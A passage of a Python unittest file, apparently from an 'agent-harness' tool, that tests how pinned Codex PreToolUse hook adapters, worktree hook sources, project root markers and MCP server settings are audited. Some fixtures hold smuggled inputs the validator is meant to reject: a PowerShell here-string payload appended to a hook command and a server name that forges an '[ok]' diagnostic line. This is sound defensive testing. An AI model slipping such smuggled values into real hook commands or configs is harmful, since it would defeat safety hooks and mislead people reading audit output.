                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_floor_rejects_windows_here_string_and_extra_call_operator(
        self,
    ) -> None:
        pin = "4" * 64
        posix = (
            f"expected={pin}; python $HOME/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        invalid_windows = (
            (
                f"$expected='{pin}'; & py -3 "
                "$env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex @'payload'@"
            ),
            (
                f"$expected='{pin}'; & & py -3 "
                "$env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex"
            ),
        )
        for command_windows in invalid_windows:
            with self.subTest(command_windows=command_windows):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": posix,
                            "commandWindows": command_windows,
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_owns_current_pinned_codex_floor_adapter(self) -> None:
        # agent-harness is an active Codex checkout, so it owns exactly one
        # project floor adapter pinned to the current dispatcher. This test
        # keeps the pin from silently drifting when dispatch.py changes.
        repo_root = Path(harness.__file__).resolve().parent
        adapter = repo_root / ".codex" / "hooks.json"
        self.assertTrue(
            adapter.is_file(),
            "agent-harness must own a .codex/hooks.json project floor adapter",
        )
        text = adapter.read_text(encoding="utf-8")
        pin = harness.normalized_text_sha256(
            repo_root / "templates" / "hooks" / "dispatch.py"
        )
        self.assertEqual(
            len(harness.repo_codex_floor_candidates(text)),
            1,
            "adapter must expose exactly one candidate floor handler",
        )
        self.assertEqual(
            len(harness.repo_codex_floor_groups(text, pin)),
            1,
            "adapter pin must match the current normalized dispatcher hash; "
            "refresh .codex/hooks.json after editing templates/hooks/dispatch.py",
        )

    def test_repo_floor_matches_blocking_handler_normalization(self) -> None:
        pin = "9" * 64
        posix = f"expected={pin}; python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
        windows = (
            f"$expected='{pin}'; py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        base_handler = {
            "type": "command",
            "command": posix,
            "commandWindows": windows,
        }
        # The canonical shape (positive timeout, synchronous) still certifies.
        good = {**base_handler, "timeout": 5}
        good_doc = json.dumps(
            {"hooks": {"PreToolUse": [{"matcher": "^Bash$", "hooks": [good]}]}}
        )
        self.assertEqual(len(harness.repo_codex_floor_groups(good_doc, pin)), 1)
        async_handler = {**base_handler, "async": True}
        async_doc = json.dumps(
            {"hooks": {"PreToolUse": [{"matcher": "^Bash$", "hooks": [async_handler]}]}}
        )
        self.assertEqual(harness.repo_codex_floor_groups(async_doc, pin), [])
        # Unknown compatibility-looking fields are ignored, and timeout null/0
        # normalize to blocking defaults rather than disabling the hook.
        for accepted_field in (
            {"background": True},
            {"nonBlocking": True},
            {"timeout": 0},
            {"timeout": None},
        ):
            with self.subTest(accepted_field=accepted_field):
                handler = {**base_handler, **accepted_field}
                doc = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [{"matcher": "^Bash$", "hooks": [handler]}]
                        }
                    }
                )
                self.assertEqual(len(harness.repo_codex_floor_groups(doc, pin)), 1)
        for invalid_field in (
            {"timeout": -1},
            {"timeout": "5"},
            {"timeout": True},
        ):
            with self.subTest(invalid_field=invalid_field):
                handler = {**base_handler, **invalid_field}
                doc = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [{"matcher": "^Bash$", "hooks": [handler]}]
                        }
                    }
                )
                with self.assertRaises(harness.HarnessError):
                    harness.repo_codex_floor_groups(doc, pin)

    def test_repo_floor_requires_bound_pin_and_executable_variable_flow(self) -> None:
        pin = "f" * 64
        posix = (
            f"expected='{pin}'; dispatcher=$HOME/.claude/hooks/dispatch.py; "
            'exec python3 "$dispatcher" --event pre --runtime codex'
        )
        windows = (
            f"$expected='{pin}';"
            "$d=Join-Path $env:USERPROFILE '.claude\\hooks\\dispatch.py';"
            "$p=Join-Path $env:SystemRoot 'py.exe';"
            "& $p -3 $d --event pre --runtime codex"
        )
        group = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": posix,
                    "commandWindows": windows,
                }
            ],
        }
        current = json.dumps({"hooks": {"PreToolUse": [group]}})
        self.assertEqual(harness.repo_codex_floor_groups(current, pin), [group])

        loose_pin = json.loads(current)
        loose_pin["hooks"]["PreToolUse"][0]["hooks"][0]["command"] = (
            "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex " + pin
        )
        self.assertEqual(
            harness.repo_codex_floor_groups(json.dumps(loose_pin), pin), []
        )

    def test_repo_floor_rejects_non_command_handler(self) -> None:
        handler = {
            "type": "prompt",
            "command": (
                "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
            ),
            "commandWindows": (
                "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex"
            ),
        }
        current = json.dumps(
            {"hooks": {"PreToolUse": [{"matcher": "^Bash$", "hooks": [handler]}]}}
        )
        self.assertEqual(harness.repo_codex_floor_groups(current), [])

    def test_normalized_text_hash_ignores_line_endings(self) -> None:
        left = Path(self.temp.name) / "left.txt"
        right = Path(self.temp.name) / "right.txt"
        left.write_bytes(b"one\r\ntwo\r\n")
        right.write_bytes(b"one\ntwo\n")
        self.assertEqual(
            harness.normalized_text_sha256(left),
            harness.normalized_text_sha256(right),
        )

    def test_root_checkout_uses_normal_repo_for_root_and_subdirectory(self) -> None:
        repo = self.make_repo()
        nested = repo / "nested" / "child"
        nested.mkdir(parents=True)
        for requested_path in (repo, nested):
            with self.subTest(requested_path=requested_path):
                requested, authoritative = harness.root_checkout(requested_path)
                self.assertEqual(requested, repo.resolve())
                self.assertEqual(authoritative, repo.resolve())
                hooks, ok, detail = harness.codex_hook_source_status(
                    requested, authoritative
                )
                self.assertTrue(ok)
                self.assertEqual(hooks, (repo / ".codex" / "hooks.json").resolve())
                self.assertIn("normal checkout", detail)

    def test_codex_existing_cwd_preserves_only_nested_aliases(self) -> None:
        anchor = Path(Path.cwd().anchor)
        top_level_alias = anchor / "repo-alias"
        nested_alias = anchor / "parent" / "repo-alias"
        canonical = anchor / "real-repo"
        for alias, expected in (
            (top_level_alias, canonical),
            (nested_alias, nested_alias),
        ):
            with self.subTest(alias=alias):
                with mock.patch.object(
                    harness,
                    "path_is_alias",
                    side_effect=lambda candidate, alias=alias: candidate == alias,
                ):
                    with mock.patch.object(Path, "resolve", return_value=canonical):
                        self.assertEqual(harness.codex_existing_cwd(alias), expected)

    def test_codex_system_config_uses_program_data_known_folder(self) -> None:
        known_folder = Path(self.temp.name) / "known-program-data"
        poisoned_environment = str(Path(self.temp.name) / "poisoned-program-data")
        expected = known_folder / "OpenAI" / "Codex" / "config.toml"

        with mock.patch.object(harness.os, "name", "nt"):
            with mock.patch.dict(
                harness.os.environ, {"PROGRAMDATA": poisoned_environment}
            ):
                with mock.patch.object(
                    harness,
                    "windows_program_data_path",
                    return_value=known_folder,
                ):
                    actual = harness.codex_system_config_path()

        self.assertEqual(actual, expected)
        self.assertNotIn(poisoned_environment, str(actual))

    def test_windows_program_data_known_folder_failure_uses_codex_fallback(
        self,
    ) -> None:
        with mock.patch.object(
            harness.ctypes,
            "WinDLL",
            side_effect=OSError("fixture unavailable"),
            create=True,
        ):
            self.assertEqual(
                harness.windows_program_data_path(), Path("C:/ProgramData")
            )

    def test_root_checkout_supports_separate_git_dir(self) -> None:
        repo = self.make_separate_git_dir_repo()
        requested, authoritative = harness.root_checkout(repo)
        self.assertEqual(requested, repo.resolve())
        self.assertEqual(authoritative, repo.resolve())

    def test_root_checkout_rejects_linked_worktree_without_separate_root_fact(
        self,
    ) -> None:
        _, linked = self.make_linked_worktree(separate_git_dir=True)
        with self.assertRaisesRegex(
            harness.HarnessError,
            "cannot resolve root checkout from Git common directory",
        ):
            harness.root_checkout(linked)

    def test_root_checkout_rejects_non_repo(self) -> None:
        outside = Path(self.temp.name) / "outside"
        outside.mkdir()
        not_a_repo = subprocess.CompletedProcess(
            ["git", "rev-parse", "--show-toplevel"], 128, "", "not a repository"
        )
        with mock.patch.object(harness, "run", return_value=not_a_repo):
            with self.assertRaisesRegex(harness.HarnessError, "not a Git repository"):
                harness.root_checkout(outside)

    def test_linked_worktree_uses_root_only_hook_source(self) -> None:
        root, linked = self.make_linked_worktree()
        root_hooks = self.write_hooks(root, '{"hooks": {}}\n')
        requested, authoritative = harness.root_checkout(linked)
        hooks, ok, detail = harness.codex_hook_source_status(requested, authoritative)
        self.assertEqual(requested, linked.resolve())
        self.assertEqual(authoritative, root.resolve())
        self.assertEqual(hooks, root_hooks.resolve())
        self.assertTrue(ok)
        self.assertIn("Codex uses root checkout source", detail)
        self.assertIn("no worktree-local copy", detail)

    def test_linked_worktree_allows_identical_ignored_hook_copy(self) -> None:
        root, linked = self.make_linked_worktree()
        text = '{"hooks": {}}\n'
        root_hooks = self.write_hooks(root, text)
        self.write_hooks(linked, text)
        requested, authoritative = harness.root_checkout(linked)
        hooks, ok, detail = harness.codex_hook_source_status(requested, authoritative)
        self.assertEqual(hooks, root_hooks.resolve())
        self.assertTrue(ok)
        self.assertIn("identical worktree copy is ignored", detail)

    def test_linked_worktree_rejects_worktree_only_hook_copy(self) -> None:
        root, linked = self.make_linked_worktree()
        local_hooks = self.write_hooks(linked, '{"hooks": {}}\n')
        requested, authoritative = harness.root_checkout(linked)
        hooks, ok, detail = harness.codex_hook_source_status(requested, authoritative)
        self.assertEqual(hooks, (root / ".codex" / "hooks.json").resolve())
        self.assertFalse(ok)
        self.assertIn(str(local_hooks.resolve()), detail)
        self.assertIn("authoritative root source is absent", detail)

    def test_linked_worktree_rejects_divergent_hook_copy(self) -> None:
        root, linked = self.make_linked_worktree()
        root_hooks = self.write_hooks(root, '{"hooks": {"root": []}}\n')
        local_hooks = self.write_hooks(linked, '{"hooks": {"worktree": []}}\n')
        requested, authoritative = harness.root_checkout(linked)
        hooks, ok, detail = harness.codex_hook_source_status(requested, authoritative)
        self.assertEqual(hooks, root_hooks.resolve())
        self.assertFalse(ok)
        self.assertIn(str(local_hooks.resolve()), detail)
        self.assertIn("ignored worktree copy differs", detail)

    def test_doctor_rejects_valid_looking_worktree_only_hook(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(linked, valid_adapter)
        result, output = self.run_doctor_with_fixture_globals(linked)
        root_hooks = (root / ".codex" / "hooks.json").resolve()
        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn(str(root_hooks.resolve()), output)
        self.assertIn("authoritative root source is absent", output)
        self.assertIn("[FAIL] project Codex floor: 0 project floor handler(s)", output)

    def test_doctor_reports_a_relative_wrapper_in_a_linked_worktree(self) -> None:
        # Codex sources the adapter from the root checkout but runs it from the
        # linked worktree, so a repo-relative wrapper path never resolves.
        root, linked = self.make_linked_worktree()
        pin = harness.normalized_text_sha256(
            Path(harness.__file__).resolve().parent
            / "templates"
            / "hooks"
            / "dispatch.py"
        )
        adapter = self.wrapper_adapter_text(
            pin, ".codex/invoke_deny_floor.sh", ".codex/invoke_deny_floor.ps1"
        )
        root_hooks = self.write_hooks(root, adapter)
        self.write_hooks(linked, adapter)

        result, output = self.run_doctor_with_fixture_globals(linked)

        self.assertEqual(result, 1)
        self.assertIn("[ok] Codex hook source: linked worktree", output)
        self.assertIn("[FAIL] project Codex floor", output)
        self.assertIn(str(root_hooks.resolve()), output)
        self.assertIn("1 handler(s) bind a session-cwd-relative wrapper path", output)

    def test_doctor_uses_identical_root_checkout_hook_source(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        root_hooks = self.write_hooks(root, valid_adapter)
        self.write_hooks(linked, valid_adapter)
        result, output = self.run_doctor_with_fixture_globals(linked)
        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex hook source: linked worktree", output)
        self.assertIn(str(root_hooks.resolve()), output)
        self.assertIn("identical worktree copy is ignored", output)
        self.assertIn("[ok] project Codex floor: 1 project floor handler(s)", output)

    def test_doctor_audits_nested_codex_layers_from_requested_directory(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        nested = repo / "nested"
        nested.mkdir()
        self.write_hooks(nested, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(nested)

        self.assertEqual(result, 1)
        self.assertIn("2 active Codex hook layer(s)", output)
        self.assertIn("[FAIL] project Codex floor: 2 project floor handler(s)", output)

    def test_doctor_audits_nested_inline_hook_layer(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        nested = repo / "nested"
        nested.mkdir()
        inline_config = self.write_inline_floor(nested)

        result, output = self.run_doctor_with_fixture_globals(nested)

        self.assertEqual(result, 1)
        self.assertIn(str(inline_config.resolve()), output)
        self.assertIn("[FAIL] project Codex floor: 2 project floor handler(s)", output)

    def test_doctor_allows_nested_config_only_layer(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        config = repo / "nested" / ".codex" / "config.toml"
        config.parent.mkdir(parents=True)
        config.write_text("[features]\nhooks = true\n", encoding="utf-8")

        result, output = self.run_doctor_with_fixture_globals(config.parent.parent)

        self.assertEqual(result, 0, output)
        self.assertIn("2 active Codex hook layer(s)", output)
        self.assertIn("[ok] project Codex floor: 1 project floor handler(s)", output)

    def test_doctor_rejects_user_project_command_mcp_duplicate(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        nested = repo / "nested"
        config = nested / ".codex" / "config.toml"
        config.parent.mkdir(parents=True)
        config.write_text(
            "[mcp_servers.docker]\n"
            'command = "docker"\n'
            'args = ["mcp", "gateway", "run", "--servers", "github"]\n',
            encoding="utf-8",
        )

        result, output = self.run_doctor_with_fixture_globals(
            nested,
            user_config=(
                "[mcp_servers.docker]\n"
                'command = "docker"\n'
                'args = ["mcp", "gateway", "run", "--profile", "safe"]\n'
            ),
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex MCP topology", output)
        self.assertIn('active command-backed MCP server "docker" is duplicated', output)
        self.assertIn(str(config.resolve()), output)

    def test_mcp_shared_user_project_source_is_not_duplicate(self) -> None:
        codex_home = Path(self.temp.name) / "codex-home"
        codex_home.mkdir()
        shared_config = codex_home / "config.toml"
        shared_config.write_text(
            "[mcp_servers.shared]\n"
            'command = "secret-command"\n'
            'args = ["private-token"]\n',
            encoding="utf-8",
        )

        ok, detail = harness.codex_mcp_topology_status(codex_home, [shared_config])

        self.assertTrue(ok, detail)
        self.assertIn("1 active user and 0 active project command-backed", detail)
        self.assertIn("0 active project config path(s)", detail)
        self.assertNotIn("duplicated", detail)
        self.assertNotIn("secret-command", detail)
        self.assertNotIn("private-token", detail)

    def test_doctor_models_layered_mcp_enablement_and_argument_source(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        project_config = repo / ".codex" / "config.toml"
        project_config.write_text(
            "[mcp_servers.MCP_DOCKER]\n" 'args = ["mcp", "gateway", "run"]\n',
            encoding="utf-8",
        )

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config=(
                "[mcp_servers.MCP_DOCKER]\n"
                'command = "docker"\n'
                'args = ["mcp", "gateway", "run", "--profile", "safe"]\n'
            ),
        )

        self.assertEqual(result, 1)
        self.assertIn("arguments in " + str(project_config.resolve()), output)
        self.assertNotIn("args = [", output)

        project_config.write_text(
            "[mcp_servers.MCP_DOCKER]\n" "enabled = false\n",
            encoding="utf-8",
        )
        codex_home = Path(self.temp.name) / "second-codex-home"
        codex_home.mkdir()
        (codex_home / "config.toml").write_text(
            "[mcp_servers.MCP_DOCKER]\n"
            'command = "docker"\n'
            'args = ["mcp", "gateway", "run"]\n',
            encoding="utf-8",
        )
        ok, detail = harness.codex_mcp_topology_status(codex_home, [project_config])
        self.assertTrue(ok, detail)
        self.assertNotIn("active Docker MCP gateway", detail)

    def test_mcp_docker_gateway_recognizes_windows_pathext_shims(self) -> None:
        args = ("mcp", "gateway", "run")
        for executable in ("docker.cmd", "DOCKER.CMD", "docker.bat", "Docker.BAT"):
            with self.subTest(executable=executable):
                self.assertTrue(harness.unbounded_docker_mcp_gateway(executable, args))
        self.assertFalse(
            harness.unbounded_docker_mcp_gateway(
                "docker.cmd", args + ("--servers=github",)
            )
        )
        self.assertFalse(harness.unbounded_docker_mcp_gateway("podman.cmd", args))

    def test_mcp_docker_gateway_matches_only_docker_subcommand(self) -> None:
        for label, args, expected in (
            ("direct", ("mcp", "gateway", "run"), True),
            ("boolean global", ("--debug", "mcp", "gateway", "run"), True),
            (
                "short boolean assignment",
                ("-D=false", "mcp", "gateway", "run"),
                True,
            ),
            (
                "combined short options",
                ("-Dldebug", "mcp", "gateway", "run"),
                True,
            ),
            (
                "combined short terminal false assignment",
                ("-Dv=0", "mcp", "gateway", "run"),
                True,
            ),
            (
                "numeric boolean assignment",
                ("--debug=1", "mcp", "gateway", "run"),
                True,
            ),
            (
                "abbreviated boolean assignment",
                ("--tls=t", "mcp", "gateway", "run"),
                True,
            ),
            (
                "value global",
                ("--context", "safe", "mcp", "gateway", "run"),
                True,
            ),
            (
                "attached long value",
                ("--config=private-config", "mcp", "gateway", "run"),
                True,
            ),
            (
                "empty attached context",
                ("--context=", "mcp", "gateway", "run"),
                True,
            ),
            (
                "empty attached config",
                ("--config=", "mcp", "gateway", "run"),
                True,
            ),
            (
                "attached short value",
                ("-ldebug", "mcp", "gateway", "run"),
                True,
            ),
            (
                "ordinary container",
                ("run", "--rm", "private-image", "mcp", "gateway", "run"),
                False,
            ),
            (
                "different subcommand",
                ("compose", "mcp", "gateway", "run"),
                False,
            ),
            (
                "missing global value",
                ("--context", "mcp", "gateway", "run"),
                False,
            ),
            (
                "missing clustered value",
                ("-Dl", "mcp", "gateway", "run"),
                False,
            ),
            (
                "malformed boolean assignment",
                ("--debug=yes", "mcp", "gateway", "run"),
                False,
            ),
            (
                "unknown shorthand",
                ("-Dq", "mcp", "gateway", "run"),
                False,
            ),
            ("terminal global", ("--version", "mcp", "gateway", "run"), False),
            (
                "false terminal assignment",
                ("-v=false", "mcp", "gateway", "run"),
                True,
            ),
            (
                "numeric false terminal assignment",
                ("--version=0", "mcp", "gateway", "run"),
                True,
            ),
            (
                "abbreviated false help assignment",
                ("--help=f", "mcp", "gateway", "run"),
                True,
            ),
            (
                "true terminal assignment",
                ("--version=true", "mcp", "gateway", "run"),
                False,
            ),
            ("option terminator", ("--", "mcp", "gateway", "run"), True),
            (
                "bounded gateway",
                (
                    "--context",
                    "safe",
                    "mcp",
                    "gateway",
                    "run",
                    "--servers=github",
                ),
                False,
            ),
        ):
            with self.subTest(label=label):
                self.assertEqual(
                    expected,
                    harness.unbounded_docker_mcp_gateway("docker", args),
                )

        codex_home = Path(self.temp.name) / "docker-container-codex-home"
        codex_home.mkdir()
        (codex_home / "config.toml").write_text(
            "[mcp_servers.container]\n"
            'command = "docker"\n'
            'args = ["run", "--rm", "private-image", "mcp", "gateway", '
            '"run", "private-argument"]\n',
            encoding="utf-8",
        )

        ok, detail = harness.codex_mcp_topology_status(codex_home, [])

        self.assertTrue(ok, detail)
        self.assertNotIn("private-image", detail)
        self.assertNotIn("private-argument", detail)

    def test_mcp_rejects_layered_mixed_transports_without_rendering_values(
        self,
    ) -> None:
        root = Path(self.temp.name)
        user = root / "user.toml"
        project = root / "project.toml"
        user.write_text(
            '[mcp_servers.one]\ncommand = "secret-command"\n', encoding="utf-8"
        )
        project.write_text(
            '[mcp_servers.one]\nurl = "https://private.invalid/token"\n',
            encoding="utf-8",
        )

        with self.assertRaisesRegex(harness.HarnessError, "mixes command") as caught:
            harness.layered_mcp_server_states([user, project])
        self.assertNotIn("secret-command", str(caught.exception))
        self.assertNotIn("private.invalid", str(caught.exception))

    def test_mcp_malformed_name_is_escaped_in_diagnostics(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text(
            '[mcp_servers."evil\\n[ok] forged"]\nenabled = "yes"\n',
            encoding="utf-8",
        )

        with self.assertRaises(harness.HarnessError) as caught:
            harness.mcp_server_patches(config)
        detail = str(caught.exception)
        self.assertNotIn("\n[ok] forged", detail)
        self.assertIn(r"\n[ok] forged", detail)

    @unittest.skipUnless(os.name == "nt", "Windows short paths are platform-specific")
    def test_mcp_source_paths_use_one_windows_filesystem_identity(self) -> None:
        config = Path(self.temp.name) / "long-name-config.toml"
        config.write_text("[mcp_servers.one]\n", encoding="utf-8")
        buffer = ctypes.create_unicode_buffer(32768)
        length = ctypes.windll.kernel32.GetShortPathNameW(
            str(config), buffer, len(buffer)
        )
        if not length or Path(buffer.value) == config:
            self.skipTest("8.3 short-path spelling is unavailable on this volume")
        short = Path(buffer.value)
        paths = harness.distinct_mcp_config_paths([config, short])
        self.assertEqual(paths, [config.resolve()])
        self.assertEqual(
            harness.mcp_server_patches(short)[0][1],
            config.resolve(),
        )

    def test_doctor_requires_canonical_root_hooks_json_adapter(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        nested = repo / "nested"
        nested.mkdir()
        self.write_hooks(nested, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(nested)

        self.assertEqual(result, 1)
        self.assertIn("1 project floor handler(s)", output)
        self.assertIn("0 canonical root hooks.json handler(s)", output)

    def test_doctor_rejects_inline_only_root_floor(self) -> None:
        repo = self.make_repo()
        self.write_inline_floor(repo)

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("1 project floor handler(s)", output)
        self.assertIn("0 canonical root hooks.json handler(s)", output)

    def test_doctor_rejects_nondefault_user_project_root_markers(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        nested = repo / "nested"
        nested.mkdir()

        result, output = self.run_doctor_with_fixture_globals(
            nested, user_config="project_root_markers = []\n"
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers", output)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_doctor_rejects_stored_profile_project_root_marker_override(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            profile_configs={
                "custom.config.toml": 'project_root_markers = ["workspace.toml"]\n'
            },
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers", output)
        self.assertIn("custom.config.toml", output)

    def test_doctor_audits_mixed_case_profile_marker_when_loadable(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            profile_configs={
                "custom.CONFIG.TOML": 'project_root_markers = ["workspace.toml"]\n'
            },
        )

        exact_alias = Path(self.temp.name) / "codex-home" / "custom.config.toml"
        if exact_alias.is_file():
            self.assertEqual(result, 1)
            self.assertIn("[FAIL] Codex project root markers", output)
            self.assertIn("custom.CONFIG.TOML", output)
        else:
            self.assertEqual(result, 0, output)

    def test_doctor_rejects_invalid_project_root_marker_shape(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config='project_root_markers = ".git"\n'
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers", output)
        self.assertIn("must be an array of strings", output)

    def test_doctor_accepts_explicit_default_project_root_markers(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config='project_root_markers = [".git"]\n'
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project root markers", output)

    def test_doctor_ignores_unrelated_nested_config_key_collisions(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        unrelated_config = (
            "[mcp_servers.demo.env]\n"
            'hooks = "literal"\n'
            'project_root_markers = "literal"\n\n'
            "[profiles.custom]\n"
            'project_root_markers = "also literal"\n\n'
            "[profiles.custom.features]\n"
            "hooks = false\n"
        )

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=unrelated_config
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] no inspectable global Codex floor", output)
        self.assertIn("[ok] Codex project root markers", output)

    def test_doctor_reports_absent_project_root_marker_override(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project root markers", output)
        self.assertIn("0 explicit inspectable declaration(s)", output)
        self.assertIn("cloud/MDM/session/plugin hooks require /hooks", output)

    def test_doctor_ignores_unsupported_legacy_profile_root_markers(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config=(
                "[profiles.custom]\n" 'project_root_markers = ["workspace.toml"]\n'
            ),
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project root markers", output)
        self.assertIn("0 explicit inspectable declaration(s)", output)

    def test_doctor_rejects_multiple_project_root_markers(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config='project_root_markers = [".git", "workspace.toml"]\n',
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers", output)

    def test_doctor_rejects_conflicting_profile_project_root_markers(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config='project_root_markers = [".git"]\n',
            profile_configs={
                "custom.config.toml": 'project_root_markers = ["workspace.toml"]\n'
            },
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers", output)
        self.assertIn("custom.config.toml", output)

    def test_doctor_rejects_invalid_marker_config_toml(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config="project_root_markers = [\n"
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers", output)
        self.assertIn("invalid Codex config", output)

    def test_doctor_rejects_unreadable_marker_config(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        with mock.patch.object(
            harness, "toml_config", side_effect=PermissionError("fixture denied")
        ):
            result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers: fixture denied", output)

    def test_doctor_rejects_user_inline_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=self.inline_floor_config_text()
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("codex-home", output)

    def test_doctor_rejects_snake_case_windows_inline_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        alias_floor = (
            "[[hooks.PreToolUse]]\n"
            'matcher = "^Bash$"\n\n'
            "[[hooks.PreToolUse.hooks]]\n"
            'type = "command"\n'
            'command = "echo noop"\n'
            "command_windows = 'py -3 \"$env:USERPROFILE/.claude/hooks/"
